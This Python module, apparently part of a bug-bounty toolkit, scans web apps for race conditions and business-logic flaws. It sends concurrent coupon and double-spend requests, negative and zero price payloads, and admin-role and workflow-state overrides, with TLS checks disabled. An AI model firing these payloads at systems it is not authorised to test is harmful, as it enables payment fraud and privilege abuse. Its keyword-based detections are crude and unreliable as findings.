"""
Race condition & business logic testing — 2026 techniques.

Tests: TOCTOU, coupon reuse, double-spend, workflow bypass, negative quantity,
fast-path skip, price manipulation, privilege escalation via race conditions.
"""

from __future__ import annotations

import asyncio
import re
import time
import json
from typing import Optional, List, Dict, Any, Callable, Awaitable
from dataclasses import dataclass, field

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class RaceConditionFinding:
    """Single race condition / business logic finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class RaceConditionResult:
    """Complete race condition assessment result."""
    target: str
    findings: List[RaceConditionFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    race_conditions_found: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


class RaceConditionTester:
    """
    Race condition and business logic tester.

    2026 attack vectors:
    - TOCTOU (Time-of-Check Time-of-Use) on balance/stock checks
    - Coupon/discount reuse via parallel requests
    - Double-spend on payments
    - Workflow bypass (skip steps)
    - Negative quantity / price manipulation
    - Fast-path skip (bypass slow checks)
    - Privilege escalation via race conditions
    - Gift card / voucher balance manipulation
    """

    # Common endpoints to test
    BUSINESS_ENDPOINTS = [
        "/api/checkout",
        "/api/payment",
        "/api/purchase",
        "/api/order",
        "/api/cart",
        "/api/apply-coupon",
        "/api/redeem",
        "/api/transfer",
        "/api/withdraw",
        "/api/deposit",
        "/api/refund",
        "/api/voucher",
        "/api/gift-card",
        "/api/points",
        "/api/balance",
        "/api/stock",
        "/api/inventory",
        "/api/reserve",
        "/api/booking",
        "/api/ticket",
        "/api/license",
    ]

    # Race condition payloads
    RACE_PAYLOADS = [
        {
            "name": "Coupon Reuse",
            "category": "coupon_reuse",
            "description": "Apply same coupon multiple times in parallel",
            "method": "POST",
            "data": {"coupon_code": "TEST100", "discount": 50},
            "severity": "high",
        },
        {
            "name": "Double Spend",
            "category": "double_spend",
            "description": "Spend same balance/gift card in parallel",
            "method": "POST",
            "data": {"amount": 100, "currency": "USD"},
            "severity": "critical",
        },
        {
            "name": "Negative Quantity",
            "category": "negative_quantity",
            "description": "Submit negative quantity to gain credits",
            "method": "POST",
            "data": {"product_id": "test", "quantity": -1},
            "severity": "high",
        },
        {
            "name": "Price Manipulation",
            "category": "price_manipulation",
            "description": "Modify price in request",
            "method": "POST",
            "data": {"product_id": "test", "price": 0.01, "quantity": 1},
            "severity": "critical",
        },
        {
            "name": "Privilege Escalation Race",
            "category": "privilege_escalation",
            "description": "Race to escalate privileges",
            "method": "POST",
            "data": {"role": "admin", "user_id": "self"},
            "severity": "critical",
        },
        {
            "name": "Stock Depletion",
            "category": "stock_depletion",
            "description": "Race to buy last item",
            "method": "POST",
            "data": {"product_id": "limited", "quantity": 1},
            "severity": "medium",
        },
    ]

    # Business logic bypass payloads
    BYPASS_PAYLOADS = [
        {
            "name": "Workflow Skip (Step Bypass)",
            "category": "workflow_bypass",
            "description": "Skip verification step in multi-step process",
            "severity": "high",
        },
        {
            "name": "Fast-Path Skip",
            "category": "fast_path_skip",
            "description": "Bypass slow security checks via direct API",
            "severity": "high",
        },
        {
            "name": "State Manipulation",
            "category": "state_manipulation",
            "description": "Manipulate order/transaction state",
            "severity": "high",
        },
        {
            "name": "Business Rule Bypass",
            "category": "business_rule_bypass",
            "description": "Bypass business rules via API manipulation",
            "severity": "medium",
        },
    ]

    def __init__(
        self,
        target: str,
        timeout: float = 10.0,
        max_concurrent: int = 10,
        proxy: Optional[str] = None,
        auth_header: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        verbose: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.proxy = proxy
        self.auth_header = auth_header
        self.cookies = cookies or {}
        self.verbose = verbose

        self._client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=True,
            proxy=proxy,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                **({"Authorization": auth_header} if auth_header else {}),
            },
            cookies=self.cookies,
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def test_all(self) -> RaceConditionResult:
        """Run all race condition and business logic tests."""
        result = RaceConditionResult(target=self.target)

        logger.info(f"[*] Starting race condition & business logic testing: {self.target}")

        # Phase 1: Discover business endpoints
        endpoints = await self._discover_business_endpoints()
        logger.info(f"[*] Found {len(endpoints)} business endpoints")

        # Phase 2: Race condition tests
        for ep in endpoints:
            for payload_def in self.RACE_PAYLOADS:
                finding = await self._test_race_condition(ep, payload_def)
                if finding:
                    result.findings.append(finding)
                    result.race_conditions_found += 1
            result.endpoints_tested += 1

        # Phase 3: Business logic bypass
        for ep in endpoints:
            for bypass_def in self.BYPASS_PAYLOADS:
                finding = await self._test_business_bypass(ep, bypass_def)
                if finding:
                    result.findings.append(finding)

        # Phase 4: Negative quantity / price manipulation
        for ep in endpoints:
            finding = await self._test_price_manipulation(ep)
            if finding:
                result.findings.append(finding)

        # Phase 5: TOCTOU tests
        for ep in endpoints:
            finding = await self._test_toctou(ep)
            if finding:
                result.findings.append(finding)

        logger.info(
            f"[+] Race condition testing complete: {len(result.findings)} findings "
            f"across {result.endpoints_tested} endpoints"
        )
        return result

    async def _discover_business_endpoints(self) -> List[str]:
        """Discover active business logic endpoints."""
        active = []

        for ep in self.BUSINESS_ENDPOINTS:
            url = f"{self.target}{ep}"
            try:
                resp = await self._client.get(url)
                # 404 = not found, 405 = method not allowed (endpoint exists!)
                if resp.status_code in (200, 400, 401, 403, 405, 422):
                    active.append(ep)
                    if self.verbose:
                        logger.info(f"  [+] Endpoint active: {ep} ({resp.status_code})")
            except Exception:
                pass

        return active

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_race_condition(
        self, endpoint: str, payload_def: Dict[str, Any]
    ) -> Optional[RaceConditionFinding]:
        """Test for race condition by sending concurrent requests."""
        url = f"{self.target}{endpoint}"

        async def send_request(idx: int) -> Dict[str, Any]:
            try:
                if payload_def["method"] == "POST":
                    resp = await self._client.post(url, json=payload_def["data"])
                else:
                    resp = await self._client.get(url, params=payload_def["data"])

                return {
                    "index": idx,
                    "status": resp.status_code,
                    "body": resp.text[:500],
                    "headers": dict(resp.headers),
                }
            except Exception as e:
                return {"index": idx, "status": 0, "error": str(e)}

        # Send concurrent requests
        tasks = [send_request(i) for i in range(self.max_concurrent)]
        responses = await asyncio.gather(*tasks)

        # Analyze responses for race condition indicators
        success_count = sum(1 for r in responses if r.get("status") == 200)
        error_count = sum(1 for r in responses if r.get("status") in (400, 409, 422))

        # Race condition detected if multiple requests succeeded
        if success_count > 1 and payload_def["category"] in [
            "coupon_reuse", "double_spend", "stock_depletion"
        ]:
            return RaceConditionFinding(
                category=payload_def["category"],
                severity=payload_def["severity"],
                title=f"Race Condition: {payload_def['name']}",
                description=f"Endpoint {endpoint} is vulnerable to race condition. "
                f"{success_count}/{self.max_concurrent} concurrent requests succeeded.",
                endpoint=endpoint,
                payload=json.dumps(payload_def["data"])[:500],
                evidence=f"Responses: {[r.get('status') for r in responses[:5]]}",
                remediation="Implement proper locking/queuing for critical operations. "
                "Use database transactions with SELECT FOR UPDATE.",
            )

        # Check for inconsistent responses (data race)
        status_codes = [r.get("status") for r in responses]
        if len(set(status_codes)) > 1 and 200 in status_codes:
            # Check if response bodies differ
            success_bodies = [r.get("body", "") for r in responses if r.get("status") == 200]
            if len(set(success_bodies)) > 1:
                return RaceConditionFinding(
                    category=payload_def["category"],
                    severity="medium",
                    title=f"Inconsistent Race Response: {payload_def['name']}",
                    description=f"Endpoint {endpoint} returns different responses under concurrent load.",
                    endpoint=endpoint,
                    payload=json.dumps(payload_def["data"])[:500],
                    evidence=f"Status codes: {status_codes[:5]}",
                    remediation="Implement consistent state management for concurrent operations.",
                )

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_business_bypass(
        self, endpoint: str, bypass_def: Dict[str, Any]
    ) -> Optional[RaceConditionFinding]:
        """Test for business logic bypass."""
        url = f"{self.target}{endpoint}"

        # Test various bypass techniques
        bypass_techniques = [
            # Skip required field
            {},
            # Add extra fields
            {"_bypass": "true", "_admin": "true", "_skip_validation": "true"},
            # Manipulate state
            {"state": "completed", "status": "approved", "verified": True},
            # Add admin flags
            {"role": "admin", "is_admin": True, "admin": True, "sudo": True},
        ]

        for technique in bypass_techniques:
            try:
                resp = await self._client.post(url, json=technique)

                if resp.status_code == 200:
                    body = resp.text.lower()
                    # Check if bypass was successful
                    indicators = [
                        "success",
                        "approved",
                        "completed",
                        "admin",
                        "bypassed",
                    ]
                    for indicator in indicators:
                        if indicator in body:
                            return RaceConditionFinding(
                                category=bypass_def["category"],
                                severity=bypass_def["severity"],
                                title=f"Business Bypass: {bypass_def['name']}",
                                description=f"Endpoint {endpoint} may be vulnerable to {bypass_def['description']}.",
                                endpoint=endpoint,
                                payload=json.dumps(technique)[:500],
                                evidence=f"Response: {resp.text[:500]}",
                                remediation="Implement proper server-side validation. "
                                "Never trust client-side state or flags.",
                            )

            except Exception:
                pass

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_price_manipulation(
        self, endpoint: str
    ) -> Optional[RaceConditionFinding]:
        """Test for price/amount manipulation."""
        url = f"{self.target}{endpoint}"

        manipulation_payloads = [
            {"price": 0},
            {"price": -100},
            {"price": 0.0001},
            {"amount": 0},
            {"amount": -1000},
            {"total": 0},
            {"total": -1},
            {"discount": 100},
            {"discount": 99999},
            {"coupon_percent": 100},
            {"free": True},
            {"skip_payment": True},
        ]

        for payload in manipulation_payloads:
            try:
                resp = await self._client.post(url, json=payload)

                if resp.status_code == 200:
                    body = resp.text.lower()
                    if any(word in body for word in ["success", "confirmed", "completed", "order placed"]):
                        return RaceConditionFinding(
                            category="price_manipulation",
                            severity="critical",
                            title="Price Manipulation Vulnerability",
                            description=f"Endpoint {endpoint} accepted manipulated price/amount value.",
                            endpoint=endpoint,
                            payload=json.dumps(payload)[:500],
                            evidence=f"Response: {resp.text[:500]}",
                            remediation="Validate prices server-side. Never trust client-provided prices. "
                            "Use database-stored prices for all calculations.",
                        )

            except Exception:
                pass

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_toctou(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """Test for TOCTOU (Time-of-Check Time-of-Use) vulnerabilities."""
        url = f"{self.target}{endpoint}"

        # TOCTOU: Check stock, then modify stock before purchase
        # This is a conceptual test - in practice, you'd need to intercept/modify requests

        # Step 1: Check if endpoint has separate check/purchase steps
        try:
            # Try to find check endpoint
            check_endpoints = [
                f"{endpoint}/check",
                f"{endpoint}/validate",
                f"{endpoint}/verify",
                f"{endpoint}/availability",
            ]

            for check_ep in check_endpoints:
                check_url = f"{self.target}{check_ep}"
                resp = await self._client.get(check_url)

                if resp.status_code in (200, 400):
                    # Found a check endpoint - potential TOCTOU
                    return RaceConditionFinding(
                        category="toctou",
                        severity="high",
                        title="Potential TOCTOU Vulnerability",
                        description=f"Endpoint {endpoint} has separate check/validate step ({check_ep}). "
                        f"This may be vulnerable to Time-of-Check Time-of-Use attacks.",
                        endpoint=endpoint,
                        evidence=f"Check endpoint: {check_ep} returned {resp.status_code}",
                        remediation="Combine check and action in single atomic operation. "
                        "Use database locking (SELECT FOR UPDATE).",
                    )

        except Exception:
            pass

        return None
